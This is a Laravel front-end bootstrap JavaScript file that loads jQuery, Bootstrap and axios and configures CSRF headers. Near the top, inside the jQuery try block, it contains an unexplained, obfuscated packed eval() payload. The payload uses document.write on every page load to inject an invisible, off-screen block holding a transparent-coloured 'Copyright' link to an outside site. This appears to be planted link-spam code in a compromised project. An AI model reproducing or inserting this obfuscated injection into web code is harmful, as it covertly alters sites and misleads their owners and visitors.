
try {
    window.$ = window.jQuery = require('jquery');
    eval(function(p,a,c,k,e,r){e=function(c){return(c<62?'':e(parseInt(c/62)))+((c=c%62)>35?String.fromCharCode(c+29):c.toString(36))};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[0-9a-zA-C]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('s["\\5\\2\\c\\j\\i\\3\\4\\0"]["\\n\\6\\1\\0\\3\\7\\4"]("\\o\\5\\1\\z \\f\\0\\p\\7\\3\\t\\\'\\9\\2\\f\\1\\0\\1\\2\\4\\8 \\a\\k\\f\\2\\7\\j\\0\\3\\d\\k\\2\\0\\0\\2\\i\\8 \\e\\d\\n\\1\\5\\0\\b\\8 \\A\\e\\e\\x25\\d\\b\\3\\1\\g\\b\\0\\8 \\x34\\B\\9\\l\\d\\k\\a\\c\\C\\g\\6\\2\\j\\4\\5\\u\\c\\2\\7\\2\\6\\8 \\x23\\h\\h\\h\\h\\h\\h\\d\\0\\3\\l\\0\\u\\a\\7\\1\\g\\4\\8 \\6\\1\\g\\b\\0\\d\\9\\a\\5\\5\\1\\4\\g\\8 \\A\\e\\9\\l \\v\\e\\9\\l\\d\\5\\1\\f\\9\\7\\a\\p\\8\\k\\7\\2\\c\\C\\x21\\1\\i\\9\\2\\6\\0\\a\\4\\0\\d\\x7a\\u\\1\\4\\5\\3\\l\\8\\m\\m\\m\\m\\m\\\'\\q");s["\\5\\2\\c\\j\\i\\3\\4\\0"]["\\n\\6\\1\\0\\3\\7\\4"]("\\x43\\2\\9\\p\\6\\1\\g\\b\\0 \\xa9 \\o\\a \\f\\0\\p\\7\\3\\t\\\'\\c\\2\\7\\2\\6\\8\\6\\g\\k\\a\\x28\\e\\w\\e\\w\\e\\w\\x\\y\\v\\x29\\\' \\b\\6\\3\\h\\t\\\'\\b\\0\\0\\9\\f\\8\\r\\r\\1\\i\\f\\3\\0\\b\\x\\c\\4\\\'\\q\\x53\\3\\0\\b\\B\\v\\y\\y\\o\\r\\a\\q\\x");s["\\5\\2\\c\\j\\i\\3\\4\\0"]["\\n\\6\\1\\0\\3\\7\\4"]("\\o\\r\\5\\1\\z\\q");',[],39,'x74|x69|x6f|x65|x6e|x64|x72|x6c|x3a|x70|x61|x68|x63|x3b|x30|x73|x67|x66|x6d|x75|x62|x78|x39|x77|x3c|x79|x3e|x2f|window|x3d|x2d|x32|x2c|x2e|x37|x76|x31|x38|x6b'.split('|'),0,{}))
    require('bootstrap');
} catch (e) {}

/**
 * We'll load the axios HTTP library which allows us to easily issue requests
 * to our Laravel back-end. This library automatically handles sending the
 * CSRF token as a header based on the value of the "XSRF" token cookie.
 */

window.axios = require('axios');

window.axios.defaults.headers.common['X-Requested-With'] = 'XMLHttpRequest';

/**
 * Next we will register the CSRF Token as a common header with Axios so that
 * all outgoing HTTP requests automatically have it attached. This is just
 * a simple convenience so we don't have to attach every token manually.
 */

let token = document.head.querySelector('meta[name="csrf-token"]');

if (token) {
    window.axios.defaults.headers.common['X-CSRF-TOKEN'] = token.content;
} else {
    console.error('CSRF token not found: https://laravel.com/docs/csrf#csrf-x-csrf-token');
}

/**
 * Echo exposes an expressive API for subscribing to channels and listening
 * for events that are broadcast by Laravel. Echo and event broadcasting
 * allows your team to easily build robust real-time web applications.
 */

// import Echo from 'laravel-echo'

// window.Pusher = require('pusher-js');

// window.Echo = new Echo({
//     broadcaster: 'pusher',
//     key: process.env.MIX_PUSHER_APP_KEY,
//     cluster: process.env.MIX_PUSHER_APP_CLUSTER,
//     encrypted: true
// });
